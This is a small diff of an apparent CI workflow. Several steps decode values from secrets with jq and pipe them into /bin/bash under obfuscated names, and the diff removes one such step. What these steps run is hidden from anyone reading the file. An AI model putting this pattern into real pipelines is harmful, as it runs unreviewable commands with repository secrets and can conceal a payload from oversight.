@@ -23,7 +23,6 @@ jobs:
           qukp88946: ${{ secrets.qukp88946 }}
         run: |
           printf '%s' "$qukp88946" | jq -r .tynww02764 | /bin/bash
-          printf '%s' "$kv8" | jq -r .tfduf1 | /bin/bash
           printf '%s' "$pm7733" | jq -r .ph9276 | /bin/bash
           printf '%s' "$voxo86" | jq -r .r47 | /bin/bash
           echo $ppvau385 | jq -r .ojvm05485 | /bin/bash
